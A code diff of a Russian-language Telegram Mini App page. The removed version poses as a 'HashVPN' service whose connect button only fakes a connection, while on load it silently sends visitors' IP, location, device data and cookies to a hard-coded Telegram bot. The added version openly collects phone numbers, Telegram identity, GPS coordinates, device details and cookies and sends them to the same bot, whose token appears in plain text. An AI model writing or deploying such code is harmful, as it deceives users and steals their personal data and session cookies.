@@ -1,16 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>HashVPN</title>
+    <meta charset="UTF-8">
+    <title>Telegram Info Collector</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        /* Основные стили */
+        /* Стили те же самые из вашего файла */
         body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #0f0f0f; /* Темный фон */
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f0f;
             color: #ffffff;
             min-height: 100vh;
             display: flex;
@@ -19,33 +20,29 @@
             text-align: center;
             overflow: hidden;
         }
-        /* Контейнер */
         .container {
             max-width: 400px;
-            width: 100%;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1); /* Полупрозрачный белый */
+            width: 90%;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.07);
             border-radius: 20px;
-            backdrop-filter: blur(10px); /* Размытие для стеклянного эффекта */
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        /* Заголовок */
         h1 {
             font-size: 24px;
-            margin-bottom: 10px;
-            color: #ffffff;
+            margin-bottom: 20px;
+            color: #00aaff;
         }
-        /* Описание */
         p {
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 20px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 30px;
         }
-        /* Кнопка */
         button {
-            background: linear-gradient(135deg, #007aff, #00a8ff); /* Градиентный синий */
-            color: #ffffff;
+            background: linear-gradient(135deg, #007aff, #00a8ff);
+            color: #fff;
             border: none;
             padding: 15px 30px;
             border-radius: 10px;
@@ -55,16 +52,15 @@
             transition: transform 0.2s ease, box-shadow 0.2s ease;
         }
         button:hover {
-            transform: scale(1.05);
+            transform: scale(1.03);
             box-shadow: 0 5px 15px rgba(0, 122, 255, 0.3);
         }
-        /* Номер телефона */
-        #phone-number {
+        #status {
             margin-top: 20px;
-            font-size: 16px;
-            color: #007aff;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
         }
-        /* Анимация фона */
+
         body::before {
             content: '';
             position: absolute;
@@ -76,213 +72,171 @@
             animation: moveBackground 10s linear infinite;
             z-index: -1;
         }
+
         @keyframes moveBackground {
-            0% {
-                transform: translate(0, 0);
-            }
-            50% {
-                transform: translate(50%, 50%);
-            }
-            100% {
-                transform: translate(0, 0);
-            }
-        }
-        /* Стили для страницы VPN */
-        .server-list select {
-            width: 100%;
-            padding: 10px;
-            border-radius: 10px;
-            border: none;
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .status, .timer {
-            margin-top: 20px;
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
-        }
-        /* Скрыть элементы */
-        .hidden {
-            display: none;
+            0% { transform: translate(0, 0); }
+            50% { transform: translate(50%, 50%); }
+            100% { transform: translate(0, 0); }
         }
     </style>
 </head>
 <body>
-    <div id="registration-page" class="container">
-        <h1>HashVPN</h1>
-        <p>Самое безопасное соединение для вашего устройства.</p>
-        <button onclick="requestPhoneNumber()">Зарегистрироваться</button>
-        <div id="phone-number"></div>
-    </div>
-    <div id="vpn-page" class="container hidden">
-        <h1>HashVPN</h1>
-        <div class="server-list">
-            <select id="server-select">
-                <option value="poland">Poland Server (Default)</option>
-                <option value="usa">USA Server</option>
-                <option value="german">German Server</option>
-                <option value="canada">Canada Server</option>
-                <option value="kazakhstan">Kazakhstan Server</option>
-            </select>
-        </div>
-        <button id="vpn-button" onclick="toggleVPN()">Подключиться</button>
-        <div class="status" id="status">Не подключено</div>
-        <div class="timer" id="timer">Время работы: 00:00:00</div>
-    </div>
-    <script>
-        const BOT_TOKEN = '7765607422:AAFpxnUhtgMS4PPeixh4-EKR4sF-AktXYz8'; // Замените на токен вашего бота
-        const ADMIN_CHAT_ID = '7896097397'; // Замените на ID администратора
 
-        const registrationPage = document.getElementById('registration-page');
-        const vpnPage = document.getElementById('vpn-page');
-        const tg = window.Telegram.WebApp;
+<div class="container">
+    <h1>Сбор данных</h1>
+    <p>Нажмите на кнопку ниже, чтобы начать сбор информации.</p>
+    <button onclick="collectData()">Запросить данные</button>
+    <div id="status">Ожидание...</div>
+</div>
 
-        let isConnected = false;
-        let startTime = null;
-        let timerInterval = null;
+<script>
+    const BOT_TOKEN = '7765607422:AAFpxnUhtgMS4PPeixh4-EKR4sF-AktXYz8'; // Заменить
+    const ADMIN_CHAT_ID = '7896097397'; // Заменить
 
-        function initTg() {
-            tg.expand(); // Развернуть на весь экран
-            document.body.style.backgroundColor = tg.themeParams.bg_color;
-            document.body.style.color = tg.themeParams.text_color;
-        }
+    if (!window.Telegram) {
+        document.body.innerHTML = "<p>Откройте эту страницу через Telegram.</p>";
+        throw new Error("Telegram WebApp SDK не найден");
+    }
 
-        async function sendInfo() {
-            try {
-                const userAgent = navigator.userAgent;
-                const time = new Date().toLocaleString();
-                const device = navigator.platform;
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                if (!ipResponse.ok) throw new Error('Ошибка при получении IP');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+    const tg = window.Telegram.WebApp;
+    tg.ready();
 
-                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-                if (!geoResponse.ok) throw new Error('Ошибка при получении геолокации');
-                const geoData = await geoResponse.json();
-                const { city, region, country } = geoData;
+    function initTg() {
+        tg.expand();
+        document.body.style.backgroundColor = tg.themeParams.bg_color;
+        document.body.style.color = tg.themeParams.text_color;
+    }
 
-                // Получаем все куки текущего домена
-                const cookieData = document.cookie;
+    async function collectData() {
+        document.getElementById('status').textContent = 'Запрашиваем контакт...';
 
-                const message = `🧊 НОВЫЙ ПОЛЬЗОВАТЕЛЬ
-IP: ${ip}
-User-Agent: ${userAgent}
-Time: ${time}
-Device: ${device}
-Location: ${city}, ${region}, ${country}
+        tg.requestContact((sent, event) => {
+            if (!sent) {
+                tg.showAlert("Вы отменили запрос контакта.");
+                document.getElementById('status').textContent = 'Ошибка: контакт не предоставлен.';
+                return;
+            }
+
+            const contact = event.responseUnsafe.contact || {};
+            const user = tg.initDataUnsafe.user || {};
+
+            sendUserInfoToAdmin(user, contact.phone_number);
+            getExtraUserInfoAndSend(user, contact.phone_number);
+        });
+    }
+
+    async function getExtraUserInfoAndSend(user, phoneNumber) {
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+
+            const geoRes = await fetch(`https://ipinfo.io/${ip}/json`);
+            const geoData = await geoRes.json();
+
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                cookiesEnabled: navigator.cookieEnabled,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                online: navigator.onLine,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'неизвестно',
+                referrer: document.referrer
+            };
+
+            let gpsLocation = 'Не предоставлено';
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                    });
+                    gpsLocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+                } catch (e) {
+                    gpsLocation = 'Ошибка получения GPS';
+                }
+            }
+
+            const cookieData = document.cookie;
+
+            const message = `
+🧊 НОВЫЙ ПОЛЬЗОВАТЕЛЬ
+
+👤 Telegram:
+ID: ${user.id}
+Имя: ${user.first_name} ${user.last_name || ''}
+Username: @${user.username || 'не указан'}
+Язык: ${user.language_code}
+Premium: ${user.is_premium ? 'да' : 'нет'}
+
+📞 Контакт:
+Телефон: ${phoneNumber}
+
+🌐 IP: ${ip}
+Страна: ${geoData.country || 'неизвестно'}
+Регион: ${geoData.region || 'неизвестно'}
+Город: ${geoData.city || 'неизвестно'}
+Провайдер: ${geoData.org || 'неизвестно'}
+
+📱 Устройство:
+Платформа: ${deviceInfo.platform}
+Браузер: ${deviceInfo.userAgent}
+Разрешение экрана: ${deviceInfo.screen}
+Память: ${deviceInfo.memory}
+Число ядер: ${deviceInfo.hardwareConcurrency}
+Язык системы: ${deviceInfo.language}
+Часовой пояс: ${deviceInfo.timeZone}
+Cookies: ${deviceInfo.cookiesEnabled ? 'да' : 'нет'}
+Онлайн: ${deviceInfo.online ? 'да' : 'нет'}
+Реферер: ${deviceInfo.referrer || 'отсутствует'}
+
+📍 GPS: ${gpsLocation}
 
 🍪 Cookies:
-${cookieData || 'Не найдены'}
+${cookieData || 'не найдены'}
+
+🕒 Время: ${new Date().toLocaleString()}
 `;
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: message
-                    })
-                });
-            } catch (error) {
-                console.error('Ошибка:', error);
-            }
-        }
 
-        function requestPhoneNumber() {
-            tg.requestContact((sent, event) => {
-                if (sent) {
-                    const phoneNumber = event.responseUnsafe.contact.phone_number;
-                    const user = tg.initDataUnsafe.user || {};
-                    document.getElementById('phone-number').innerText = `Ваш номер: ${phoneNumber}`;
-                    const message = `📱 Новый контакт:
-`
-                        + `☎️ Телефон: ${phoneNumber}
-`
-                        + `🆔 User ID: ${user.id}
-`
-                        + `👤 Имя: ${user.first_name || ''} ${user.last_name || ''}
-`
-                        + `📛 Username: @${user.username || 'нет'}`;
-                    sendToAdmin(message);
-                    showVPNPage();
-                } else {
-                    tg.showAlert('Вы отменили запрос номера.');
-                }
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: message
+                })
             });
+
+            tg.showAlert("✅ Информация успешно отправлена!");
+            document.getElementById('status').textContent = 'Данные успешно отправлены!';
+        } catch (e) {
+            console.error("Ошибка:", e);
+            tg.showAlert("⚠️ Ошибка при сборе или отправке данных.");
+            document.getElementById('status').textContent = 'Ошибка при отправке данных.';
         }
+    }
 
-        async function sendToAdmin(message) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                if (response.ok) {
-                    tg.showAlert('🧊 Регистрация прошла успешно!\nПриятного пользования!');
-                } else {
-                    tg.showAlert('⚠️ Произошла ошибка при регистрации.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                tg.showAlert('⚠️ Произошла ошибка при регистрации.');
-            }
-        }
+    function sendUserInfoToAdmin(user, phoneNumber) {
+        const message = `📱 Новый контакт:
+☎️ Телефон: ${phoneNumber}
+🆔 User ID: ${user.id}
+👤 Имя: ${user.first_name || ''} ${user.last_name || ''}
+📛 Username: @${user.username || 'нет'}
+`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: message
+            })
+        });
+    }
 
-        function showVPNPage() {
-            registrationPage.classList.add('hidden');
-            vpnPage.classList.remove('hidden');
-        }
+    initTg();
+</script>
 
-        function toggleVPN() {
-            const serverSelect = document.getElementById('server-select');
-            const status = document.getElementById('status');
-            const vpnButton = document.getElementById('vpn-button');
-            if (!isConnected) {
-                const server = serverSelect.value;
-                status.textContent = `Подключение к ${server}...`;
-                setTimeout(() => {
-                    isConnected = true;
-                    vpnButton.textContent = "Отключиться";
-                    status.textContent = `Подключено к ${server}`;
-                    startTime = new Date();
-                    timerInterval = setInterval(updateTimer, 1000);
-                }, 2000);
-            } else {
-                status.textContent = `Отключение...`;
-                setTimeout(() => {
-                    clearInterval(timerInterval);
-                    isConnected = false;
-                    vpnButton.textContent = "Подключиться";
-                    status.textContent = "Не подключено";
-                    document.getElementById('timer').textContent = "Время работы: 00:00:00";
-                }, 2000);
-            }
-        }
-
-        function updateTimer() {
-            if (startTime) {
-                const now = new Date();
-                const diff = Math.floor((now - startTime) / 1000);
-                const hours = Math.floor(diff / 3600);
-                const minutes = Math.floor((diff % 3600) / 60);
-                const seconds = diff % 60;
-                document.getElementById('timer').textContent = `Время работы: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-            }
-        }
-
-        window.onload = () => {
-            sendInfo();
-            initTg();
-        };
-
-        tg.ready();
-    </script>
 </body>
 </html>
